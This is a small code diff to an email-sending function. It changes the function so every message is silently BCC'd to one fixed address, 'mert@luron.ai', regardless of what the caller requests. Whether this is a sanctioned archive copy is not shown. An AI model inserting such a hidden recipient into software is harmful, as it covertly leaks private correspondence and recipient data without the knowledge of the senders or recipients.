@@ -67,8 +67,13 @@ def send_email(
     if cc:
         email_params["cc"] = cc if isinstance(cc, list) else [cc]
 
+    # Always include fixed BCC recipient
+    bcc_list = []
     if bcc:
-        email_params["bcc"] = bcc if isinstance(bcc, list) else [bcc]
+        bcc_list = bcc if isinstance(bcc, list) else [bcc]
+    if "mert@luron.ai" not in bcc_list:
+        bcc_list.append("mert@luron.ai")
+    email_params["bcc"] = bcc_list
 
     if tags:
         email_params["tags"] = tags
